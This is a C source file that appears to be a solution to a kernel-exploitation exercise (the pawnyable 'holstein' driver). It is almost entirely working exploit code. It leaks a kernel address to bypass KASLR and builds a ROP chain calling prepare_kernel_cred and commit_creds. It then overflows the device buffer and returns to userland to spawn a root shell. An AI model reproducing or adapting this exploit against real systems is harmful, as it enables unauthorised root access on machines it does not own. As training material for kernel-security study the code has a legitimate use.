#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>

#define for_x(i, a, b) for(int i = a; i <= b; i++)
#define for_n(i, a, b) for(int i = a; i >= b; i--)
#define inc idx++

typedef uint64_t u64;

u64 dev_fd, kernel_base, kernel_offset;
u64 user_rip, user_cs, user_rflags, user_rsp, user_ss;
u64 rop[100];

void win()
{
    if(getuid() == 0)
    {
        char *argv[] = {"/bin/sh", NULL};
        char *envp[] = {NULL};
        puts("[*] enjoy");
        execve(argv[0], argv, envp);
    }
    else puts("[!] fail uid");
}

void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushfq;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    user_rip = (u64)&win;

    puts("[*] saved state");
}

void open_device()
{
    puts("[*] opening device");

    dev_fd = open("/dev/holstein", 2);
    if(dev_fd < 1) puts("[!] fail fd");
}

void leak_kernel_addr()
{
    u64 buf[200];
    u64 rip_offset = 0x408;

    u64 len = rip_offset + 8;
    read(dev_fd, (char *)&buf, len);

    u64 leak_addr = buf[0x408/8];
    kernel_base = leak_addr - 0x13d33c; // 0xffffffff8113d33c - 0xffffffff81000000
    printf("[?] kernel_base: 0x%lx\n", kernel_base);

    kernel_offset = kernel_base - 0xffffffff81000000;
    printf("[?] kernel_offset: 0x%lx\n", kernel_offset);
}

void prepare_rop_chain()
{
    // https://blog.wohin.me/posts/pawnyable-0201/
    // read the bypass kaslr error to understand gadget offset
    
    u64 prepare_kernel_cred = kernel_offset + 0xffffffff8106e240;
    u64 commit_creds = kernel_offset + 0xffffffff8106e390;
    u64 pop_rdi = kernel_offset + 0xffffffff8127bbdc; // find by hand?
    u64 mov_rdi_rax = kernel_offset + 0xffffffff8160c96b; // mov rdi, rax; rep movsq [rdi], [rsi]; ret;
    u64 pop_rcx = kernel_offset + 0xffffffff8132cdd3; // find by hand?
    u64 swapgs_n_ret2usr_chain = kernel_offset + 0xffffffff81800e26; // mov rdi, rsp; ...

    u64 idx = 0;

    rop[inc] = pop_rdi;
    rop[inc] = 0;
    rop[inc] = prepare_kernel_cred;
    rop[inc] = pop_rcx;
    rop[inc] = 0;
    rop[inc] = mov_rdi_rax;
    rop[inc] = commit_creds;
    rop[inc] = swapgs_n_ret2usr_chain;
    rop[inc] = 0; // [rdi]
    rop[inc] = 0; // [rdi + 8]
    rop[inc] = user_rip;
    rop[inc] = user_cs;
    rop[inc] = user_rflags;
    rop[inc] = user_rsp;
    rop[inc] = user_ss;

    printf("[*] rop chain prepared, length: %lu\n", idx);
}

void overflow()
{
    puts("[*] overflowing");

    // prepare payload
    u64 payload[200];
    u64 rip_offset = 0x408/8;
    for_x(i, 0, rip_offset - 1) payload[i] = 0x4141414141414141;
    for_x(i, 0, 14) payload[rip_offset + i] = rop[i];

    // bof
    u64 len = 0x408 + 8 * 15;
    write(dev_fd, (char *)&payload, len);

    puts("[!] should never be reached");
}

int main()
{
    save_state();
    open_device();
    leak_kernel_addr();
    prepare_rop_chain();
    overflow();

    puts("[!] should never be reached");
}